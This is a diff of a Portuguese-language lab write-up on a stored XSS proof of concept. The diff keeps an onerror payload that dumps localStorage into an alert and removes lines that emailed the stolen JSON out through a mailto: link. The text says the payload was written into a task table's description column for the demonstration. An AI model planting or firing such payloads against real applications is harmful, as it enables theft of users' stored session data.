@@ -54,10 +54,6 @@ dispara `onerror` ao falhar o carregamento.
   (function(){
     var d = JSON.stringify(localStorage);
     alert('Dados roubados do localStorage:\n' + d);
-    var u = 'mailto:rafael.leal@inchurch.com.br'
-      + '?subject=' + encodeURIComponent('[DEMO XSS] Exfiltracao Projeto00')
-      + '&body=' + encodeURIComponent(d);
-    window.location.href = u;
   })()
 ">
 ```
@@ -72,11 +68,6 @@ O que cada parte faz:
 3. `alert(...)` — mostra o conteúdo roubado na tela, só para efeito didático de prova de
    conceito (num ataque real, o atacante **não** mostraria um alerta — isso alertaria a
    vítima).
-4. `mailto:` + `encodeURIComponent(d)` — monta um link `mailto:` com o destinatário,
-   assunto e corpo (o JSON roubado) já preenchidos, e `window.location.href = u` navega
-   para esse link, abrindo o cliente de e-mail padrão do sistema operacional da vítima
-   com a mensagem pronta para enviar.
-
 Esse registro já foi inserido diretamente na tabela `tarefas_tarefa` (coluna
 `descricao`), associado ao usuário `ana@example.com` (id `1`), com o nome
 "Tarefa de demonstracao XSS", para fins deste laboratório.
